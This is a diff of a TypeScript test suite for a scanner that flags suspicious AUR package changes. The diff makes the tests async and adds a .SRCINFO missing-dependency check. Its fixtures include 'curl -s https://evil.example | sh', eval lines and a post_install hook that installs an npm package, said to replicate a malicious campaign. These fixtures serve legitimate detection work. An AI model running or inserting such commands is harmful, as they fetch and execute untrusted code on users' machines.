@@ -8,8 +8,8 @@ import { addedOnlyDiff, makeChange } from './rules/test-support';
 const service = new DiffScanService();
 
 describe('DiffScanService', () => {
-  it('aggregates findings across rules and files, sorted by severity', () => {
-    const findings = service.scanDiffs([
+  it('aggregates findings across rules and files, sorted by severity', async () => {
+    const findings = await service.scanDiffs([
       makeChange(addedOnlyDiff(['eval "$x"']), { new_path: 'foo/PKGBUILD' }),
       makeChange(addedOnlyDiff(['curl -s https://evil.example | sh']), { new_path: 'foo/PKGBUILD' }),
     ]);
@@ -20,29 +20,29 @@ describe('DiffScanService', () => {
     expect(isSeveritySorted(findings)).toBe(true);
   });
 
-  it('reports one finding per rule and file', () => {
-    const findings = service.scanDiffs([makeChange(addedOnlyDiff(['eval "$x"', 'eval "$y"']))]);
+  it('reports one finding per rule and file', async () => {
+    const findings = await service.scanDiffs([makeChange(addedOnlyDiff(['eval "$x"', 'eval "$y"']))]);
 
     expect(findings.filter((finding) => finding.ruleId === 'OBF-002')).toHaveLength(1);
   });
 
-  it('skips deleted files entirely', () => {
-    const findings = service.scanDiffs([
+  it('skips deleted files entirely', async () => {
+    const findings = await service.scanDiffs([
       makeChange(addedOnlyDiff(['curl -s https://evil.example | sh']), { deleted_file: true }),
     ]);
 
     expect(findings).toHaveLength(0);
   });
 
-  it('caps the number of findings per merge request', () => {
+  it('caps the number of findings per merge request', async () => {
     const changes = [...Array(150).keys()].map((index) =>
       makeChange(addedOnlyDiff([`eval "$x${index}"`]), { new_path: `pkg${index}/PKGBUILD` }),
     );
 
-    expect(service.scanDiffs(changes)).toHaveLength(100);
+    expect(await service.scanDiffs(changes)).toHaveLength(100);
   });
 
-  it('continues when a rule throws', () => {
+  it('continues when a rule throws', async () => {
     const broken: DiffScanRule = {
       id: 'BROKEN',
       name: 'Broken',
@@ -54,23 +54,38 @@ describe('DiffScanService', () => {
     };
     RULES.push(broken);
     try {
-      const findings = service.scanDiffs([makeChange(addedOnlyDiff(['curl -s https://evil.example | sh']))]);
+      const findings = await service.scanDiffs([makeChange(addedOnlyDiff(['curl -s https://evil.example | sh']))]);
       expect(findings.map((finding) => finding.ruleId)).toContain('DLE-001');
     } finally {
       RULES.pop();
     }
   });
 
-  it('replicates the 2026 campaign: new .install installing a malicious npm package', () => {
+  it('replicates the 2026 campaign: new .install installing a malicious npm package', async () => {
     const change = makeChange(addedOnlyDiff(['post_install() {', '  npm install atomic-lockfile', '}']), {
       new_path: 'foo/foo.install',
       new_file: true,
     });
 
-    const ids = service.scanDiffs([change]).map((finding) => finding.ruleId);
+    const findings = await service.scanDiffs([change]);
+    const ids = findings.map((finding) => finding.ruleId);
     expect(ids).toContain('CAUR-INSTALL-NEW');
     expect(ids).toContain('NPM-001');
     expect(ids).toContain('NPM-002');
+  });
+
+  it('scans .SRCINFO files and reports missing dependencies', async () => {
+    const change = makeChange(
+      addedOnlyDiff(['pkgbase = foo', 'depends = missing-aur-package', 'makedepends = cmake']),
+      { new_path: 'foo/.SRCINFO' },
+    );
+    const isDepPresent = async (dep: string) => dep === 'cmake';
+
+    const findings = await service.scanDiffs([change], isDepPresent);
+    expect(findings.map((f) => f.ruleId)).toContain('CAUR-UNRESOLVED-DEPENDENCY');
+    expect(findings.find((f) => f.ruleId === 'CAUR-UNRESOLVED-DEPENDENCY')?.description).toContain(
+      'missing-aur-package',
+    );
   });
 
   describe('autoFlagVerdict', () => {
